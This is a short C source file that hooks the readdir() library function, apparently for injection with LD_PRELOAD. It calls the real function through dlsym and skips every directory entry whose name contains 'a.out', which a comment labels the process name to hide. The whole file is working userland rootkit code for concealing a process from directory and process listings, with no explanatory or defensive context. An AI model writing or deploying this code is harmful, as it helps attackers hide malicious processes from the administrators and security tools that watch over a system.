#define _GNU_SOURCE
#include <dirent.h>
#include <string.h>
#include <dlfcn.h>

static struct dirent* (*real_readdir)(DIR*) = NULL;

struct dirent* readdir(DIR* dirp) {
    if (!real_readdir) {
        real_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent* dir;
    while ((dir = real_readdir(dirp)) != NULL) {
        if (strstr(dir->d_name, "a.out")) {  // Process name to hide
            continue;
        } else {
            break;
        }
    }
    return dir;
}

